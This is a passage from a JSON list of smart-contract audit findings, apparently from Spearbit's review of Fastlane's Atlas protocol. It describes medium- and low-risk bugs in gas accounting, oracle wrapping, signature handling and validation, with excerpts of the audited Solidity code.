        "body": "The ChainlinkAtlasWrapper is intended to be used by integrating protocols as a replacement for the original BASE_FEED Chainlink contract. There are currently two things that would make this integration difficult: 1. The latestRoundData() function does not maintain the behavior from the original Chainlink oracle. This function always returns the current roundId, startedAt, and answeredInRound from the BASE_FEED. This means that an oracle update in the ChainlinkAtlasWrapper will change the overall answer, but will not change the corresponding roundId. This implies that one roundId can have multiple answers, which is not possible in the original Chainlink contracts. 2. There are some functions missing in the ChainlinkAtlasWrapper. For example, the decimals() and getRoundData() functions are commonly used by protocols, but do not exist in the ChainlinkAtlasWrapper.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "callIndex incremented twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _executeSolverOperation() increases callIndex. The function is also called from a loop in either _bidFindingIteration() or _bidKnownIteration(). So callIndex is incremented twice for every failed SolverOp, which doesn't seems logical. Also see issue \"_bidFindingIteration doesn't reset key.callIndex\" how this is a factor in limiting the maximum solvers to 83. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... for (uint256 i; i < j; i++) { (auctionWon, key) = _executeSolverOperation(/*...*/ ); if (auctionWon) { // ... return (auctionWon, key); } } } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... key = key.holdSolverLock(solverOp.solver); // increments callIndex // ... if (result.executionSuccessful()) { key.solverSuccessful = true; return (true, key); // auctionWon = true } // ... ++key.callIndex; // why is this done? Is within a loop // ... } function holdSolverLock(EscrowKey memory self, address nextSolver) internal pure returns (EscrowKey ,! memory) { // ... ++self.callIndex; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Winning solver doesn't get gas costs _assign()ed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _executeSolverOperation() doesn't call _releaseSolverLock() for the winning solver so the gas costs don't get _assign()ed. function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.executionSuccessful()) { // ... key.solverSuccessful = true; // auctionWon = true return (true, key); // no call to _releaseSolverLock } // ... _releaseSolverLock(solverOp, gasWaterMark, result, false, !prevalidated); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "claims accounting only tracks execution costs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The claims storage variable records the ETH that will be reimbursed to the bundler for paying transaction fees. Currently, this value only tracks the difference between two calls to gasleft(), which implies that the bundler is only reimbursed for execution costs between two markers. However, there are other costs associated with being a bundler, for example, a base 21_000 gas cost for the entire transaction and an additional cost for each byte of calldata. To be more accurate, these costs could be added to the claims accounting. It appears that this was already intended based on the following commented-out code: uint256 gasMarker = gasleft(); // + 21_000 + (msg.data.length * _CALLDATA_LENGTH_PREMIUM); and also based on the fact that _releaseSolverLock() may charge some solvers for their calldata costs.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect SURCHARGE multiplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the _setAtlasLock() function, the following code sets claims to the maximum amount of ETH the bundler will use, including a surcharge: // Set the claimed amount uint256 rawClaims = (gasMarker + 1) * tx.gasprice; claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000); Later on in the _settle() function, the remaining unused gas is subtracted from claims, also including the sur- charge: uint256 gasRemainder = (gasleft() * tx.gasprice); gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000); _claims -= gasRemainder; Since both of these terms included the surcharge, the _claims value in _settle() ultimately represents the total ETH used by the bundler plus the surcharge amount. Therefore the following calculation is based on a combined amount, which is incorrect: uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; _claims -= netGasSurcharge; surcharge = _surcharge + netGasSurcharge; SafeTransferLib.safeTransferETH(bundler, _claims); For example, with a 10% surcharge, this code sets netGasSurcharge to 10% of 110% of the total ETH used, which leads to the bundler only being reimbursed 99% of the ETH they spent.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Call to validateUserOp() won't work",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_verifyUser() uses the ERC4337 function validateUserOp() to validate smart contract wallets. There are several reasons why this won't work:  entryPoint v0.6 has a different layout for UserOperation.  entryPoint v0.7 has yet another layout for UserOperation.  smartwallets usually allow only calls from the EntryPoint to validateUserOp, see BaseAccount.sol.  Any random smart contract that has a fallback function that returns 0 on unknown functions would satisfy this check. Note: other erc-4337 wallets usually don't put a gas limit when calling validateUserOp(). function _verifyUser(/*...*/ ) /*...*/ { if (userOp.from.code.length > 0) { // ... bool validSmartWallet = IAccount(userOp.from).validateUserOp{ gas: 30_000 }(userOp, _getProofHash(userOp), 0) == 0; return (isSimulation || validSmartWallet); } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "V2DAppControl allows both amount0Out and amount1Out to be non-zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "V2DAppControl assumes exactly one amount0Out and amount1Out is non-zero, but this isn't en- forced. If both these values are non-zero, amount0In and amount1In are calculated incorrectly: uint256 amount0In = amount1Out == 0 ? 0 : SwapMath.getAmountIn(amount1Out, uint256(token0Balance), uint256(token1Balance)); ,! uint256 amount1In = amount0Out == 0 ? 0 : SwapMath.getAmountIn(amount0Out, uint256(token1Balance), uint256(token0Balance)); ,! This calculation assumes that after the swap, the pool will only transfer out exactly one token.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ChainlinkAtlasWrapper allows retransmitting old reports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "When transmit() is called on the ChainlinkAtlasWrapper, there is nothing checking that the report and corresponding signatures haven't been used before. While the transmitters are whitelisted and trusted to an extent, this behavior means a single bad actor can exploit the system (which is otherwise secured by multiple independent parties).",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Solvers don't always reimburse the bundler",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the Atlas system, bundlers pay gas fees upfront and are eventually reimbursed throughout the transaction flow. This is facilitated through the claims storage variable (which tracks the total amount due), the _releaseSolverLock() function (which assigns a reimbursement amount to a specific solver), and finally the _- settle() function (which ensures that deposits >= withdrawals + claims). While this system generally assigns costs fairly, there are two situations where reimbursements are not made as expected. Both situations are the result of an early return that skips a call to _releaseSolverLock(), even though the early return may be caused by a _PARTIAL_REFUND error (which is expected to result in a gas reimbursement). The first location of this issue is in the _getBidAmount() function, where _releaseSolverLock() is only reached if all validation succeeds and the solverMetaTryCatch() call is made. Also, note that since there are situations where gas is charged, there seems to be a contradiction with the following comment in the function: // NOTE: To prevent a malicious bundler from aggressively collecting storage refunds, // solvers should not be on the hook for any on chain bid finding gas usage.   The second location of this issue is in the _executeSolverOperation() function, where an early return can happen if the _handleAltOpHash() logic fails.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Deadline check skipped in simulation mode",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Deadline check for userOp and dAppOp is skipped in simulation mode. This shouldn't be the case as a successful simulation will lead to an onchain transaction which will then revert wasting gas for the bundler.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "amount is downcasted to uint112 without overflow protection",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "amount is downcasted from uint256 to uint112 at various places in AtlEth.sol as highlighted above. transfer() and transferFrom() could do an emit with a very large amount if passing an amount such as type(uint112).max + 1. This will confuse chain indexers. function _deduct(address account, uint256 amount) internal { uint112 amt = uint112(amount); // ... revert InsufficientBalanceForDeduction(/*...*/ , amount); // possibly large amount } function _burn(address from, uint256 amount) internal { _deduct(from, amount); totalSupply -= amount; // ... // will fail with large amount } function transfer(address to, uint256 amount) public returns (bool) { _deduct(msg.sender, amount); _balanceOf[to].balance += uint112(amount); emit Transfer(msg.sender, to, amount); // could do emit with large amount // ... } function transferFrom(address from, address to, uint256 amount) public returns (bool) { uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals. if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; // could fail _deduct(from, amount); _balanceOf[to].balance += uint112(amount); emit Transfer(from, to, amount); // could do emit with large amount return true; } In _unbond() an artificial amount is emitted when passing an amount such as type(uint112).max + 1. 36 function unbond(uint256 amount) external { _unbond(msg.sender, amount); } function _unbond(address owner, uint256 amount) internal { uint112 amt = uint112(amount); // can be truncated // ... emit Unbond(owner, amount, block.number + ESCROW_DURATION + 1); } Function _mint() also does the downcast. But this won't happen in practice because it is only called via deposit() and depositAndBond() which are bounded by msg.value. function _mint(address to, uint256 amount) internal { totalSupply += amount; _balanceOf[to].balance += uint112(amount); emit Transfer(address(0), to, amount); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Solver bundler doesn't enforce exactly one solverOps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _verifyAuctioneer() use solverOps[0]. This will revert when there are no solverOps. Note: this can happen when allowsZeroSolvers()==true. As we understood from the Fastlane project, when a solver is also a bundler there should be exactly one solverOps. This isn't enforced in the code. function _verifyAuctioneer(/*...*/ ) /*...*/ { // ... if (dConfig.callConfig.allowsSolverAuctioneer() && dAppOp.from == solverOps[0].from) return (true, true); // ... ,! }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "External calls may use more gas than gasLimit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the following case, .call copies the entire return data to memory even if it isn't used: (success,) = solverOp.solver.call{ gas: gasLimit, value: solverOp.value }(solverCallData); Since this leads to memory expansion costs, this call may use significantly more gas than just the gasLimit value. The solverGasLimit is used in _validateSolverOperation() to ensure a solver has sufficient funds, so it's likely unexpected for this call to use extra gas. Although data isn't supposed to be returned in this call, it may be done intentionally by an adversarial solver to grief the system.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "reconcile() can be called by anyone",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Anyone can call reconcile() because the the checks on lock and currentSolver are done with user supplied parameters. These checks can even pass when lock == UNLOCKED or _solverLock == _- UNLOCKED_UINT. Function reconcile() can set the flags _solverCalledBack and _solverFulfilled. Luckily _trySolverLock() resets these flags. Although _trySolverLock() isn't always done, as show in the issue \"_releaseSolverLock() can be run without _trySolverLock()\". Currently that doesn't create an issue. Function reconcile() can do several unwanted actions:  reconcile() creates deposits out of thin air  Flag _solverFulfilled is unreliable After validateBalances then _solverFulfilled is not used anymore. After _settle() then deposits is not used anymore. Places where reconcile() can be called:  Before the call to metacall() ! not an issue.  In PreOps hook ! before validateBalances and _settle() so is an issue.  In UserOp hook ! before validateBalances and _settle() so is an issue.  In Solver / PreSolver ! not an issue because then it is supposed to happen.  In AllocateValue ! before _settle() so is an issue.  In PostOps ! before _settle() so is an issue.  Via safeTransferETH() of _settle() ! after the relevant logic of _settle() so is no issue.  Via safeTransferETH() of metacall() ! deposits not used ! no issue. 38 function reconcile(address environment, address solverFrom,...) ... { ,! // ... if (lock != environment) revert InvalidExecutionEnvironment(lock); // environment is user supplied (address currentSolver, bool calledBack, bool fulfilled) = solverLockData(); if (solverFrom != currentSolver) revert InvalidSolverFrom(currentSolver); // solverFrom is user supplied // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack; // ... _solverLock = uint256(uint160(currentSolver)) | _solverCalledBack | _solverFulfilled; } function _trySolverLock(SolverOperation calldata solverOp) internal returns (bool valid) { if (_borrow(solverOp.value)) { _solverLock = uint256(uint160(solverOp.from)); // resets flags  ,! _solverFulfilled   _solverCalledBack  and // ... } else { // ... } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A solver with insufficient funds can block further processing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _settle() reverts if the Solver can't pay for the costs. When function _settle() reverts then metacall() also reverts. The costs could be: gas usage or any Borrow()s after validateBalances(). This way a solver with insufficient funds can block further processing of the other solvers. However a user would expect that when a solver fails, then next solver in the list would be used. In comparison: When a solver doesn't win, and via _releaseSolverLock(), the gas _assign()ment fails, then that error is ignored. Note: Borrow()s after validateBalances() are questionable, see issue \"Borrow()s after validateBalances()\". function _settle(/*...*/ ) /*...*/ { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); } // ... } function _releaseSolverLock(/*...*/ ) /*...*/ { // ... _assign(solverOp.from, gasUsed, false, bidFind); // failure to assign is ignored } 39",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Remove Test inheritance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "SolverBase inherits from Test contract: contract SolverBase is Test { This increases the contract size and may expose any unsafe functionality.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "disableDApp() doesn't clean up dAppSignatories[]",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "disableDApp() doesn't clean up dAppSignatories[] like _removeSignatory() does. This could be a problem if the dapp would be enabled again, then dAppSignatories[] would contain the same govAddress address twice. Also getDAppSignatories() doesn't give an accurate view. Function disableDApp() doesn't check the signatoryKey was enabled, like changeDAppGovernance() does. This could result in redundant emits. 40 function disableDApp(address dAppControl) external { // ... signatories[signatoryKey] = false; //... // no clean up of dAppSignatories[] } function _removeSignatory(address controller, address signatory) internal { // ... delete signatories[signatoryKey]; for (uint256 i = 0; i < dAppSignatories[controller].length; i++) { if (dAppSignatories[controller][i] == signatory) { dAppSignatories[controller][i] = ,! dAppSignatories[controller][dAppSignatories[controller].length - 1]; dAppSignatories[controller].pop(); break; } } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use of storage variables versus delegatecall",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The usage of storage with DAppControl is not trivial:  If DAppControl based contracts use a storage variable it wil be stored in the ExecutionEnvironment and it can be changed by a user contract if called via delegatecall.  Contract ChainlinkDAppControl uses storage variable verificationVars (but luckily delegateUser: false).  Contract SwapIntentController allows delegatecall via delegateUser: true (but luckily no storage variables).  DAppControl has two storage variables: governance and pendingGovernance, which means all functions that access these should not be delegatecalled.  The functions getDAppSignatory(), transferGovernance() and acceptGovernance() don't have the modifier mustBeCalled so could accidentally be called via delegatecall. 41 abstract contract DAppControl is DAppControlTemplate, ExecutionBase { // ... address public governance; address public pendingGovernance; // ... } contract SwapIntentController is DAppControl { constructor(address _atlas) DAppControl(_atlas, msg.sender, CallConfig({ // ... delegateUser: true, // ... }) ) // ... } contract ChainlinkDAppControl is DAppControl { // ... mapping(address baseChainlinkFeed => VerificationVars) internal verificationVars; // storage constructor(address _atlas) DAppControl(_atlas, msg.sender, CallConfig({ // ... delegateUser: false, // ... }) ) // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "V2DAppControl _preOpsCall() doesn't check destination for call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_preOpsCall() calls a function from userOp.dapp but doesn't check if it is a valid uniswap V2 compatible pair. function _preOpsCall(UserOperation calldata userOp) internal override returns (bytes memory) { // ... (uint112 token0Balance, uint112 token1Balance,) = IUniswapV2Pair(userOp.dapp).getReserves(); // ... _transferUserERC20( amount0Out > amount1Out ? IUniswapV2Pair(userOp.dapp).token1() : ,! IUniswapV2Pair(userOp.dapp).token0(), userOp.dapp, amount0In > amount1In ? amount0In : amount1In ); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "No validity check on chainlinkWrapper",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In _allocateValueCall() there is no check done that chainlinkWrapper is valid. function _allocateValueCall(address bidToken, uint256 bidAmount, bytes calldata data) internal virtual ,! override { address chainlinkWrapper = abi.decode(data, (address)); (bool success,) = chainlinkWrapper.call{ value: bidAmount }(\"\"); if (!success) revert FailedToAllocateOEV(); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CallValueTooHigh error calculation is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the _validateSolverOperation() function, the following check verifies that solverOp.value is larger than address(this).balance minus a gas amount: // Verify that we can lend the solver their tx value if ( solverOp.value > address(this).balance - (gasLimit * tx.gasprice > address(this).balance ? 0 : gasLimit * tx.gasprice) return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); ,! ) { } the gasLimit * tx.gasprice > address(this).balance check appears to prevent a In this calculation, in the subtraction underflow if gasLimit * tx.gasprice is larger than address(this).balance. However, case where the underflow would happen, is 0 (which results in solverOp.value > address(this).balance) when it was likely intended to be address(this).balance (which results in solverOp.value > 0). the subtracted amount Moreover, it's not clear if this subtraction is completely necessary for this check. Since the transaction gas costs will not decrease address(this).balance, and since all borrowed ETH and gas refunds are guaranteed to be paid at the end of an Atlas transaction, it may be possible to simplify the check.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Signatures may be reused between the ChainlinkAtlasWrapper and BASE_FEED",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The ChainlinkAtlasWrapper is intended to be a wrapper of the Chainlink BASE_FEED contract, with the two contracts potentially sharing the same signers and transmitters. Since both contracts have the same arguments and verification logic in the transmit() function, it seems that the report and corresponding signatures for one contract can also be used in the other contract. This may not be intended, and may add a trust assumption that the transmitter relays information to the correct contract that the signers are expecting.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "claims accounting does not track all execution costs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "To facilitate bundler gas reimbursements, the claims storage variable tracks the gas costs between two different gasleft() checkpoints. Since the gas costs incurred after the second checkpoint are not tracked, there is some amount of gas that the bundler is not reimbursed. Currently, this amounts to all of the following code within _settle(): gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000); _claims -= gasRemainder; if (_deposits < _claims + _withdrawals) { // CASE: in deficit, subtract from bonded balance uint256 amountOwed = _claims + _withdrawals - _deposits; if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); } } else { // CASE: in surplus, add to bonded balance // TODO: make sure this works w/ the surcharge 10% uint256 amountCredited = _deposits - _claims - _withdrawals; _credit(winningSolver, amountCredited); } uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; _claims -= netGasSurcharge; surcharge = _surcharge + netGasSurcharge; SafeTransferLib.safeTransferETH(bundler, _claims); return (_claims, netGasSurcharge); and also includes the cost of later emitting the MetacallResult() event and calling _releaseAtlasLock(). While these are not necessarily large costs, making the gas accounting more fair for the bundler may be possible.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Similar functions pack() and _firstSet()/_firstSetSpecial() use different patterns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The similar functions pack() and _firstSet()/_firstSetSpecial() use different patterns. pack() uses a typecast to bytes32() while the other functions don't. Note: the typecast to bytes32() truncates the data if it is larger than 32 bytes, which isn't the case here. function pack(EscrowKey memory self) internal pure returns (bytes32 packedKey) { packedKey = bytes32( //bytes32 not present in other functions and truncates data abi.encodePacked( self.addressPointer, // ... ) ); } function _firstSet() internal pure returns (bytes memory data) { data = abi.encodePacked( _addressPointer(), // ... ); } function _firstSetSpecial(ExecutionPhase phase) internal pure returns (bytes memory data) { // ... data = abi.encodePacked( _addressPointer(), // ... ); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "USER_TYPE_HASH and SOLVER_TYPE_HASH define data as bytes32",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The USER_TYPE_HASH and SOLVER_TYPE_HASH define data as bytes32, while in reality it is bytes. _getProofHash() and _getSolverHash() do already hash the data. 46 bytes32 constant USER_TYPE_HASH = keccak256(\"UserOperation(... ,bytes32 data)\"); bytes32 constant SOLVER_TYPE_HASH = keccak256(\"SolverOperation(... ,bytes32 data)\"); function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256( abi.encode( // ... keccak256(userOp.data) ) ); } function _getSolverHash(SolverOperation calldata solverOp) internal pure returns (bytes32 solverHash) { return keccak256( abi.encode( // ... keccak256(solverOp.data) ) ); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "SOLVER_TYPE_HASH contains different field than SolverOperation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The SOLVER_TYPE_HASH contains dapp, wheras the struct SolverOperation has solver at the same location. bytes32 constant SOLVER_TYPE_HASH = keccak256( \"SolverOperation(address from, ... uint256 deadline, address dapp, // should probably be solver address control, ... )\" ); struct SolverOperation { // ... uint256 deadline; address solver; address control; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Statistics for auctionWins and auctionFails are inaccurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _assign() keeps statistics for auctionWins and auctionFails. The inverse function _credit() doesn't keep statistics. function _assign(/*...*/ ) /*...*/ { // ... if (solverWon) { aData.auctionWins++; } else if (!bidFind) { aData.auctionFails++; } // ... } function _credit(address owner, uint256 amount) internal { // ... // no statistics }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "totalGasUsed is inaccurate",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function _assign(), amount can be changed if the solver has insufficient funds. The totalGa- sUsed uses the corrected version, because it is mean to analytics, the original value is probably better. The inverse function _credit() doesn't keep statistics. Furthermore, _assign() is called for two purposes. One to assign gas costs and one to assign missing ETH. Only the first one seems relevant for analytics. 48 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... if (bData.unbonding + aData.bonded < amt) { // ... amount = uint256(bData.unbonding + aData.bonded); // contribute less to deposits ledger // ... } ... // Reputation Analytics: Track total gas used, solver wins, and failures aData.totalGasUsed += uint64(amount / GAS_USED_DECIMALS_TO_DROP); // ... } function _credit(address owner, uint256 amount) internal { // ... // no statistics for totalGasUsed }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "userWrapper() does not always need forward() data",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "At the end of the userWrapper() function, a call or delegatecall is made to the userOp.dapp address: if (config.needsDelegateUser()) { (success, returnData) = userOp.dapp.delegatecall(forward(userOp.data)); require(success, \"ERR-EC02 DelegateRevert\"); } else { // regular user call - executed at regular destination and not performed locally (success, returnData) = userOp.dapp.call{ value: userOp.value }(forward(userOp.data)); require(success, \"ERR-EC04a CallRevert\"); } Notice that this call will use the forward() helper function. This function appends extra data (e.g. address pointers, call depth, etc) so that Atlas-specific contracts can inspect the state of the call. However, the userOp.dapp address may not be an Atlas-specific contract. For example, with the V2DAppControl, the userOp.dapp address would be a UniswapV2 pool. As a result, the extra calldata will not always be used or expected. In rare scenarios, this might cause reverts in protocols that have unique calldata expectations.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Balance diff considerations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the solverMetaTryCatch() function, the ExecutionEnvironment tracks the difference in its bid token balance before and after the solver receives control flow. The assumption is that an increase in token balance would be due to a direct transfer from the solver. However, there are niche situations where this assumption might not hold. For example, if the ExecutionEnvi- ronment becomes eligible for an airdrop, and if the airdrop transfer can be triggered by an arbitrary address (this is how the Uniswap MerkleDistributor works), then solvers might trigger the airdrop to subsidize their bid. This would be unexpected, as the airdrop already belongs to the ExecutionEnvironment, but is not explicitly part of its balance. If the ExecutionEnvironment was used more generally as a smart contract wallet, there may be other ways that a balance diff becomes problematic. For example, if the ExecutionEnvironment has permitted a non-Atlas protocol to exchange one of its tokens, fulfilling that order could increase the bid token balance, and wouldn't be related to the solver's actions. This is similar to a bug that appeared in UniswapX.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_credit() deviates from logic in _assign()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _assign() updates deposits but the mirror function _credit() doesn't update with- drawals. As can be called from multiple locations it is important there. _credit() can only be called from via _settle(). However, after this call there is an external call via safeTransferETH() so it is potentially risky to not update withdrawals. See issue \"Call to safeTransferETH can do unwanted actions\". As far as we can see, no harm can be done. 50 function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { // ... if (_assign(winningSolver, amountOwed, true, false)) { revert InsufficientTotalBalance((_claims + _withdrawals) - deposits); // uses updated ,! deposits } } else { // ... _credit(winningSolver, amountCredited); } // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { // ... bondedTotalSupply -= amount; deposits += amount; } function _credit(address owner, uint256 amount) internal { // ... bondedTotalSupply += amount; // ... // no change in withdrawals }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Special cases for deadline == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "It seems userOp.deadline==0 and dAppOp.deadline==0 indicate there is no deadline. However there is no special case for solverOp.deadline == 0. _handleAltOpHash() enforces the deadlines of solverOp and userOp.deadline to be the same. So could be an issue if solverOp.deadline == 0 isn't supported. 51 function _validCalls( // ... if (block.number > userOp.deadline) { if (userOp.deadline != 0 && !isSimulation) { return (userOpHash, ValidCallsResult.UserDeadlineReached); } } if (block.number > dAppOp.deadline) { if (dAppOp.deadline != 0 && !isSimulation) { return (userOpHash, ValidCallsResult.DAppDeadlineReached); } } // ... } function _validateSolverOperation( // ... if (block.number > solverOp.deadline) { // no exception for 0 return (/*...*/ ); } // ... } function _handleAltOpHash(/*...*/ ) /*...*/ { // ... if (solverOp.deadline != userOp.deadline || solverOp.control != userOp.control) { return false; } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_handleAltOpHash() executed even in error situations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
